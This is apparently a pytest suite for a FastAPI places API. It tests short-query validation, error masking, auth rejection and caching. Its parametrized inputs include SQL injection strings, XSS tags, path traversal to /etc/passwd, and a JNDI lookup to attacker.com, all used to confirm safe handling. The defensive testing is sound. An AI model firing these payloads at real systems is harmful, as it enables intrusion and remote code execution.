"""Adversarial stress-test suite for GOFA Places client and REST endpoints.

Empirical Challenger verification for Milestone 1:
1. Boundary conditions and edge cases (< 3 chars MUST return 422).
2. Extremely long queries, special unicode, injection & path traversal attempts.
3. Detail lookup edge cases (empty ID, whitespace ID, missing ID -> 404).
4. Security & error masking (502 on upstream failure, 503 on unconfigured key, zero secret leaks).
5. Quota discipline & cache behavior under stress.
6. Authentication fail-closed semantics.
"""

from __future__ import annotations

import concurrent.futures

import pytest
from fastapi.testclient import TestClient

from greenlogix_api.main import app
from greenlogix_api.places.gofa import GofaPlaceProvider
from greenlogix_api.routers import places as places_router

AUTH_HEADER = {"Authorization": "Bearer DEMO"}


@pytest.fixture
def places_client(monkeypatch):
    """TestClient with demo auth enabled and fresh places provider."""
    monkeypatch.setenv("GREENLOGIX_DEMO", "1")
    places_router.reset_places_provider()
    with TestClient(app) as client:
        yield client
    places_router.reset_places_provider()


# ============================================================================
# 1. BOUNDARY CONDITIONS ON /places/autocomplete (< 3 chars -> 422)
# ============================================================================


@pytest.mark.parametrize(
    "sub_min_query",
    [
        "",  # Empty string
        " ",  # Single whitespace
        "   ",  # Multi whitespace
        "\t",  # Tab
        "\n",  # Newline
        " \t \r\n ",  # Mixed whitespace
        "a",  # 1 ASCII character
        "ab",  # 2 ASCII characters
        " a ",  # 1 char padded with whitespace
        "  ab  ",  # 2 chars padded with whitespace
        "Hà",  # 2 unicode characters (Vietnamese)
        "🚀",  # 1 emoji character
        "🏢🏢",  # 2 emoji characters
        "1",  # 1 digit
        "12",  # 2 digits
        "?",  # 1 punctuation
        "?!",  # 2 punctuations
    ],
)
def test_autocomplete_under_3_chars_strictly_returns_422(places_client, sub_min_query):
    """Any query under 3 non-whitespace characters MUST return HTTP 422."""
    resp = places_client.get(
        "/places/autocomplete", params={"q": sub_min_query}, headers=AUTH_HEADER
    )
    assert resp.status_code == 422, (
        f"Expected 422 for query {sub_min_query!r}, got {resp.status_code}"
    )
    body = resp.json()
    assert "min 3 chars" in body.get("detail", "").lower()


def test_autocomplete_missing_q_parameter_returns_422(places_client):
    """Omitting the ?q parameter entirely defaults to empty string and returns 422."""
    resp = places_client.get("/places/autocomplete", headers=AUTH_HEADER)
    assert resp.status_code == 422
    assert "min 3 chars" in resp.json().get("detail", "").lower()


@pytest.mark.parametrize(
    "valid_boundary_query",
    [
        "abc",  # Exactly 3 characters
        "  xyz  ",  # 3 characters with surrounding whitespace
        "HCM",  # 3 uppercase chars
        "Hà Nội",  # Vietnamese diacritics
        "🏢🏢🏢",  # 3 emoji characters
        "123",  # 3 digits
        "Q.1",  # 3 chars with punctuation
    ],
)
def test_autocomplete_at_least_3_chars_accepted(
    places_client, monkeypatch, valid_boundary_query
):
    """Queries of 3 or more non-whitespace characters pass validation and reach provider."""
    captured = []

    def mock_transport(url: str, headers: dict[str, str], timeout: float):
        captured.append(url)
        return 200, {"predictions": []}

    provider = GofaPlaceProvider(api_key="TEST_KEY", transport=mock_transport)
    monkeypatch.setattr(places_router, "_provider", lambda: provider)

    resp = places_client.get(
        "/places/autocomplete", params={"q": valid_boundary_query}, headers=AUTH_HEADER
    )
    assert resp.status_code == 200
    assert resp.json() == []
    assert len(captured) == 1


# ============================================================================
# 2. ADVERSARIAL INPUTS ON /places/autocomplete (SQLi, Traversal, Unicode, Length)
# ============================================================================


def test_autocomplete_extremely_long_query(places_client, monkeypatch):
    """Extremely long query strings (10,000+ chars) do not crash the service."""
    long_query = "Landmark 81 " + ("A" * 10_000)

    def mock_transport(url: str, headers: dict[str, str], timeout: float):
        assert len(url) > 10_000
        return 200, {"predictions": []}

    provider = GofaPlaceProvider(api_key="TEST_KEY", transport=mock_transport)
    monkeypatch.setattr(places_router, "_provider", lambda: provider)

    resp = places_client.get(
        "/places/autocomplete", params={"q": long_query}, headers=AUTH_HEADER
    )
    assert resp.status_code == 200
    assert resp.json() == []


@pytest.mark.parametrize(
    "injection_payload",
    [
        "' OR '1'='1",
        "'; DROP TABLE orders; --",
        "1 UNION SELECT 1, 2, 3, 4, 5",
        "' OR 1=1 #",
        "admin'--",
        '" OR ""="',
        "<script>alert('xss')</script>",
        "javascript:alert(1)",
        "\x00nullbyte",
        "../../../../etc/passwd",
        "..\\..\\windows\\system32",
        "{{7*7}}",
        "${jndi:ldap://attacker.com/evil}",
    ],
)
def test_autocomplete_injection_payloads_safely_encoded(
    places_client, monkeypatch, injection_payload
):
    """Adversarial injection payloads in autocomplete query are URL-encoded and safe."""
    called_urls = []

    def mock_transport(url: str, headers: dict[str, str], timeout: float):
        called_urls.append(url)
        return 200, {"predictions": []}

    provider = GofaPlaceProvider(api_key="TEST_KEY", transport=mock_transport)
    monkeypatch.setattr(places_router, "_provider", lambda: provider)

    resp = places_client.get(
        "/places/autocomplete", params={"q": injection_payload}, headers=AUTH_HEADER
    )
    assert resp.status_code == 200
    assert resp.json() == []
    assert len(called_urls) == 1
    # Verify no raw unencoded quote or bracket breaks URL
    assert "https://places-api.gofa.vn/v5/Place/AutoComplete" in called_urls[0]


def test_autocomplete_unicode_bidirectional_and_complex_scripts(
    places_client, monkeypatch
):
    """Special Unicode sequences (BIDI overrides, zero-width joiners) are handled safely."""
    bidi_query = "\u202e\u202d\u200e\u200fQuận 1 TP.HCM"

    def mock_transport(url: str, headers: dict[str, str], timeout: float):
        return 200, {"predictions": []}

    provider = GofaPlaceProvider(api_key="TEST_KEY", transport=mock_transport)
    monkeypatch.setattr(places_router, "_provider", lambda: provider)

    resp = places_client.get(
        "/places/autocomplete", params={"q": bidi_query}, headers=AUTH_HEADER
    )
    assert resp.status_code == 200
    assert resp.json() == []


# ============================================================================
# 3. BOUNDARY CONDITIONS ON /places/detail/{place_id} (Empty, Whitespace, 404)
# ============================================================================


def test_detail_empty_place_id_returns_404(places_client):
    """Empty place_id paths (/places/detail/ and /places/detail) return HTTP 404."""
    resp1 = places_client.get("/places/detail/", headers=AUTH_HEADER)
    assert resp1.status_code == 404

    resp2 = places_client.get("/places/detail", headers=AUTH_HEADER)
    assert resp2.status_code == 404


@pytest.mark.parametrize(
    "whitespace_id",
    [
        "%20",  # Single space
        "%20%20%20",  # Multiple spaces
        "%09",  # Tab
        "%0A",  # Newline
        "%0D",  # Carriage return
        "%20%09%20",  # Mixed whitespace
    ],
)
def test_detail_whitespace_only_place_id_returns_404(places_client, whitespace_id):
    """Whitespace-only place_id returns 404 before calling upstream."""
    resp = places_client.get(f"/places/detail/{whitespace_id}", headers=AUTH_HEADER)
    assert resp.status_code == 404
    assert resp.json()["detail"] == "not_found"


def test_detail_non_existent_place_id_returns_404(places_client, monkeypatch):
    """Non-existent place_id when upstream returns ZERO_RESULTS returns 404."""

    def mock_transport(url: str, headers: dict[str, str], timeout: float):
        return 200, {"status": "ZERO_RESULTS", "result": {}}

    provider = GofaPlaceProvider(api_key="TEST_KEY", transport=mock_transport)
    monkeypatch.setattr(places_router, "_provider", lambda: provider)

    resp = places_client.get(
        "/places/detail/non_existent_place_id_12345", headers=AUTH_HEADER
    )
    assert resp.status_code == 404
    assert resp.json()["detail"] == "not_found"


@pytest.mark.parametrize(
    "traversal_path",
    [
        "/places/detail/../../etc/passwd",
        "/places/detail/..%2F..%2Fetc%2Fpasswd",
        "/places/detail/%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/places/detail/....//....//etc/passwd",
        "/places/detail/..%5c..%5cwindows%5cwin.ini",
    ],
)
def test_detail_path_traversal_attempts_never_leak_filesystem(
    places_client, monkeypatch, traversal_path
):
    """Path traversal sequences in detail URL either resolve to 404 or safe 404/502."""

    def mock_transport(url: str, headers: dict[str, str], timeout: float):
        return 200, {"status": "ZERO_RESULTS", "result": {}}

    provider = GofaPlaceProvider(api_key="TEST_KEY", transport=mock_transport)
    monkeypatch.setattr(places_router, "_provider", lambda: provider)

    resp = places_client.get(traversal_path, headers=AUTH_HEADER)
    # MUST be 404 (route resolution or not_found) - never 200 or 500
    assert resp.status_code == 404


@pytest.mark.parametrize(
    "sqli_id",
    [
        "' OR '1'='1",
        "1; DROP TABLE orders; --",
        "place' UNION SELECT * FROM users --",
    ],
)
def test_detail_sql_injection_attempts_safe(places_client, monkeypatch, sqli_id):
    """SQL injection payloads in place_id return 404 without database error."""

    def mock_transport(url: str, headers: dict[str, str], timeout: float):
        # Upstream will not find this id
        return 200, {"status": "ZERO_RESULTS", "result": {}}

    provider = GofaPlaceProvider(api_key="TEST_KEY", transport=mock_transport)
    monkeypatch.setattr(places_router, "_provider", lambda: provider)

    resp = places_client.get(f"/places/detail/{sqli_id}", headers=AUTH_HEADER)
    assert resp.status_code == 404


# ============================================================================
# 4. SECURITY & ERROR MASKING (Zero Secret Leaks, 502, 503)
# ============================================================================


def test_error_masking_zero_secret_leak_on_network_timeout(places_client, monkeypatch):
    """Upstream network exceptions masking: returns 502 with ZERO secret leaks in body or headers."""
    secret_key = "GOFA_SUPER_SECRET_PRODUCTION_KEY_987654321"

    def failing_transport(url: str, headers: dict[str, str], timeout: float):
        raise TimeoutError(
            f"Connection to {url} timed out with auth key {headers.get('X-API-Key')}"
        )

    provider = GofaPlaceProvider(api_key=secret_key, transport=failing_transport)
    monkeypatch.setattr(places_router, "_provider", lambda: provider)

    # Autocomplete
    r_ac = places_client.get(
        "/places/autocomplete", params={"q": "Landmark 81"}, headers=AUTH_HEADER
    )
    assert r_ac.status_code == 502
    assert r_ac.json() == {"detail": "Upstream places provider error"}
    assert secret_key not in r_ac.text
    for h, v in r_ac.headers.items():
        assert secret_key not in h and secret_key not in v

    # Detail
    r_det = places_client.get(
        "/places/detail/gofa_hcmc_landmark81", headers=AUTH_HEADER
    )
    assert r_det.status_code == 502
    assert r_det.json() == {"detail": "Upstream places provider error"}
    assert secret_key not in r_det.text
    for h, v in r_det.headers.items():
        assert secret_key not in h and secret_key not in v


@pytest.mark.parametrize("status_code", [400, 401, 403, 404, 429, 500, 503, 504])
def test_upstream_http_errors_map_to_502(places_client, monkeypatch, status_code):
    """Any non-200 HTTP response from upstream GOFA maps cleanly to 502."""

    def error_transport(url: str, headers: dict[str, str], timeout: float):
        return status_code, {"error": "Upstream issue"}

    provider = GofaPlaceProvider(api_key="TEST_KEY", transport=error_transport)
    monkeypatch.setattr(places_router, "_provider", lambda: provider)

    r_ac = places_client.get(
        "/places/autocomplete", params={"q": "Landmark 81"}, headers=AUTH_HEADER
    )
    assert r_ac.status_code == 502

    r_det = places_client.get(
        "/places/detail/gofa_hcmc_landmark81", headers=AUTH_HEADER
    )
    assert r_det.status_code == 502


def test_unconfigured_api_key_honest_503(places_client, monkeypatch):
    """When GOFA_API_KEY is not configured and fallback disabled, returns honest 503."""
    provider = GofaPlaceProvider(api_key="", fallback=None)
    monkeypatch.setattr(places_router, "_provider", lambda: provider)

    r_ac = places_client.get(
        "/places/autocomplete", params={"q": "Landmark 81"}, headers=AUTH_HEADER
    )
    assert r_ac.status_code == 503
    assert "unconfigured" in r_ac.json()["detail"]

    r_det = places_client.get(
        "/places/detail/gofa_hcmc_landmark81", headers=AUTH_HEADER
    )
    assert r_det.status_code == 503
    assert "unconfigured" in r_det.json()["detail"]


# ============================================================================
# 5. UPSTREAM CORRUPT/UNEXPECTED PAYLOAD RESILIENCE
# ============================================================================


@pytest.mark.parametrize(
    "corrupt_payload",
    [
        "not a dict",
        12345,
        [{"predictions": []}],
        None,
    ],
)
def test_autocomplete_corrupt_upstream_payload_yields_502(
    places_client, monkeypatch, corrupt_payload
):
    """Non-dict JSON payload from upstream raises 502 Bad Gateway."""

    def corrupt_transport(url: str, headers: dict[str, str], timeout: float):
        return 200, corrupt_payload

    provider = GofaPlaceProvider(api_key="TEST_KEY", transport=corrupt_transport)
    monkeypatch.setattr(places_router, "_provider", lambda: provider)

    resp = places_client.get(
        "/places/autocomplete", params={"q": "Landmark 81"}, headers=AUTH_HEADER
    )
    assert resp.status_code == 502


def test_autocomplete_malformed_prediction_items_skipped(places_client, monkeypatch):
    """Items in predictions missing place_id or not dicts are gracefully skipped."""
    payload = {
        "predictions": [
            "string_item",
            None,
            {},  # Missing place_id
            {"place_id": ""},  # Empty place_id
            {
                "place_id": "valid_place_1",
                "description": "Valid Place Description",
                "structured_formatting": {"main_text": "Valid Place"},
            },
        ]
    }

    def mock_transport(url: str, headers: dict[str, str], timeout: float):
        return 200, payload

    provider = GofaPlaceProvider(api_key="TEST_KEY", transport=mock_transport)
    monkeypatch.setattr(places_router, "_provider", lambda: provider)

    resp = places_client.get(
        "/places/autocomplete", params={"q": "Valid Place"}, headers=AUTH_HEADER
    )
    assert resp.status_code == 200
    suggestions = resp.json()
    assert len(suggestions) == 1
    assert suggestions[0]["place_id"] == "valid_place_1"


def test_detail_resilience_to_missing_geometry_and_compound(places_client, monkeypatch):
    """Detail endpoint handles sparse upstream result without crashing."""
    sparse_payload = {
        "status": "OK",
        "result": {
            "place_id": "sparse_place_id",
            "formatted_address": "Sparse Address",
            # geometry is missing entirely
            # compound is missing entirely
        },
    }

    def mock_transport(url: str, headers: dict[str, str], timeout: float):
        return 200, sparse_payload

    provider = GofaPlaceProvider(api_key="TEST_KEY", transport=mock_transport)
    monkeypatch.setattr(places_router, "_provider", lambda: provider)

    resp = places_client.get("/places/detail/sparse_place_id", headers=AUTH_HEADER)
    assert resp.status_code == 200
    data = resp.json()
    assert data["place_id"] == "sparse_place_id"
    assert data["lat"] == 0.0
    assert data["lng"] == 0.0
    assert data["ward"] is None
    assert data["district"] is None
    assert data["province"] is None


# ============================================================================
# 6. AUTHENTICATION & ROLE ISOLATION (Fail Closed)
# ============================================================================


def test_places_rejects_missing_auth(places_client):
    """Places endpoints reject requests without Authorization header (401)."""
    r1 = places_client.get("/places/autocomplete", params={"q": "Landmark 81"})
    assert r1.status_code == 401

    r2 = places_client.get("/places/detail/gofa_hcmc_landmark81")
    assert r2.status_code == 401


def test_places_rejects_invalid_bearer_token(places_client):
    """Places endpoints reject invalid bearer tokens (401)."""
    headers = {"Authorization": "Bearer MALICIOUS_OR_EXPIRED_TOKEN"}
    r1 = places_client.get(
        "/places/autocomplete", params={"q": "Landmark 81"}, headers=headers
    )
    assert r1.status_code == 401

    r2 = places_client.get("/places/detail/gofa_hcmc_landmark81", headers=headers)
    assert r2.status_code == 401


def test_places_rejects_driver_pin_auth(places_client):
    """Driver PIN header (X-Driver-Pin) alone CANNOT access dispatcher places endpoints."""
    headers = {"X-Driver-Pin": "0000"}
    r1 = places_client.get(
        "/places/autocomplete", params={"q": "Landmark 81"}, headers=headers
    )
    assert r1.status_code == 401

    r2 = places_client.get("/places/detail/gofa_hcmc_landmark81", headers=headers)
    assert r2.status_code == 401


# ============================================================================
# 7. CACHING & CONCURRENCY INTEGRITY
# ============================================================================


def test_autocomplete_caching_case_insensitive(places_client, monkeypatch):
    """Autocomplete cache treats queries case-insensitively to conserve quota."""
    calls = []

    def mock_transport(url: str, headers: dict[str, str], timeout: float):
        calls.append(url)
        return 200, {
            "predictions": [
                {
                    "place_id": "test_id",
                    "description": "Test Place",
                    "structured_formatting": {"main_text": "Test"},
                }
            ]
        }

    provider = GofaPlaceProvider(api_key="TEST_KEY", transport=mock_transport)
    monkeypatch.setattr(places_router, "_provider", lambda: provider)

    r1 = places_client.get(
        "/places/autocomplete", params={"q": "landmark 81"}, headers=AUTH_HEADER
    )
    assert r1.status_code == 200
    assert len(calls) == 1

    # Same query in uppercase must hit cache
    r2 = places_client.get(
        "/places/autocomplete", params={"q": "LANDMARK 81"}, headers=AUTH_HEADER
    )
    assert r2.status_code == 200
    assert len(calls) == 1  # Unchanged!


def test_concurrent_detail_requests(places_client, monkeypatch):
    """Concurrent requests to detail endpoint resolve correctly without race conditions."""

    def mock_transport(url: str, headers: dict[str, str], timeout: float):
        return 200, {
            "status": "OK",
            "result": {
                "place_id": "p_concurrent",
                "formatted_address": "Concurrent St",
                "geometry": {"location": {"lat": 10.1, "lng": 106.1}},
            },
        }

    provider = GofaPlaceProvider(api_key="TEST_KEY", transport=mock_transport)
    monkeypatch.setattr(places_router, "_provider", lambda: provider)

    def fetch_detail(pid: str):
        return places_client.get(f"/places/detail/{pid}", headers=AUTH_HEADER)

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = [
            executor.submit(fetch_detail, f"p_concurrent_{i}") for i in range(10)
        ]
        results = [f.result() for f in futures]

    for res in results:
        assert res.status_code == 200
        assert res.json()["place_id"] == "p_concurrent"
